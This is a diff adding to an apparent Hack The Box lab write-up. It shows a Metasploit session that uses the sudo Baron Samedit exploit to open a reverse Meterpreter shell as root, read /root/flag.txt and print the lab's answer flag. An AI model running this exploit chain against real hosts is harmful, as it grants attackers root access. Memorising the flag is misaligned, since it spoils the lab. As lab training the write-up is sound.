@@ -134,3 +134,88 @@ Sudoers file grammar version 46
 Sudoers I/O plugin version 1.8.31
 ```
 
+
+```
+msf6 exploit(linux/http/elfinder_archive_cmd_injection) > search sudo 1.8
+
+Matching Modules
+================
+
+   #   Name                                                                    Disclosure Date  Rank       Check  Description
+   -   ----                                                                    ---------------  ----       -----  -----------
+   0   exploit/linux/local/sudo_baron_samedit                                  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
+   1     \_ target: Automatic                                                  .                .          .      .
+   2     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)                .                .          .      .
+   3     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative  .                .          .      .
+   4     \_ target: Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)                .                .          .      .
+   5     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)                .                .          .      .
+   6     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27) - alternative  .                .          .      .
+   7     \_ target: Ubuntu 16.04 x64 (sudo v1.8.16, libc v2.23)                .                .          .      .
+   8     \_ target: Ubuntu 14.04 x64 (sudo v1.8.9p5, libc v2.19)               .                .          .      .
+   9     \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28)                   .                .          .      .
+   10    \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28) - alternative     .                .          .      .
+   11    \_ target: CentOS 8 x64 (sudo v1.8.25p1, libc v2.28)                  .                .          .      .
+   12    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17)                    .                .          .      .
+   13    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17) - alternative      .                .          .      .
+   14    \_ target: Fedora 27 x64 (sudo v1.8.21p2, libc v2.26)                 .                .          .      .
+   15    \_ target: Fedora 26 x64 (sudo v1.8.20p2, libc v2.25)                 .                .          .      .
+   16    \_ target: Fedora 25 x64 (sudo v1.8.18, libc v2.24)                   .                .          .      .
+   17    \_ target: Fedora 24 x64 (sudo v1.8.16, libc v2.23)                   .                .          .      .
+   18    \_ target: Fedora 23 x64 (sudo v1.8.14p3, libc v2.22)                 .                .          .      .
+   19    \_ target: Manual                                                     .                .          .      .
+   20  exploit/linux/local/sudoedit_bypass_priv_esc                            2023-01-18       excellent  Yes    Sudoedit Extra Arguments Priv Esc
+   21  exploit/linux/ssh/vyos_restricted_shell_privesc                         2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation
+
+
+Interact with a module by name or index. For example info 21, use 21 or use exploit/linux/ssh/vyos_restricted_shell_privesc
+
+msf6 exploit(linux/http/elfinder_archive_cmd_injection) >  use exploit/linux/local/sudo_baron_samedit
+
+msf6 exploit(linux/local/sudo_baron_samedit) > set lhost tun0
+lhost => 10.10.14.186
+msf6 exploit(linux/local/sudo_baron_samedit) > set session 1
+session => 1
+
+msf6 exploit(linux/local/sudo_baron_samedit) > run
+
+[*] Started reverse TCP handler on 10.10.14.186:4444 
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session architecture: x86
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
+[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
+[*] Writing '/tmp/IXM4mUmVH.py' (763 bytes) ...
+[*] Writing '/tmp/libnss_4F/mbEu .so.2' (548 bytes) ...
+[*] Sending stage (3045380 bytes) to 10.129.203.52
+[+] Deleted /tmp/IXM4mUmVH.py
+[+] Deleted /tmp/libnss_4F/mbEu .so.2
+[+] Deleted /tmp/libnss_4F
+[*] Meterpreter session 2 opened (10.10.14.186:4444 -> 10.129.203.52:35964) at 2024-05-20 11:12:08 -0300
+
+meterpreter > getuid 
+Server username: root
+
+meterpreter > ls /root/
+Listing: /root/
+===============
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100600/rw-------  178    fil   2022-05-16 12:35:30 -0300  .bash_history
+100644/rw-r--r--  3106   fil   2022-05-16 12:34:51 -0300  .bashrc
+040700/rwx------  4096   dir   2022-05-16 10:46:07 -0300  .cache
+040700/rwx------  4096   dir   2022-05-16 10:46:06 -0300  .config
+040755/rwxr-xr-x  4096   dir   2022-05-16 10:46:07 -0300  .local
+100644/rw-r--r--  161    fil   2019-12-05 11:39:21 -0300  .profile
+100644/rw-r--r--  75     fil   2022-05-16 05:45:33 -0300  .selected_editor
+040700/rwx------  4096   dir   2021-10-06 14:37:09 -0300  .ssh
+100600/rw-------  13300  fil   2022-05-16 12:34:51 -0300  .viminfo
+100644/rw-r--r--  291    fil   2022-05-16 10:51:29 -0300  .wget-hsts
+100644/rw-r--r--  24     fil   2022-05-16 12:18:40 -0300  flag.txt
+040755/rwxr-xr-x  4096   dir   2021-10-06 14:37:19 -0300  snap
+
+meterpreter > cat /root/flag.txt 
+HTB{5e55ion5_4r3_sw33t}
+```
+The answer is : 
+> ==HTB{5e55ion5_4r3_sw33t}==
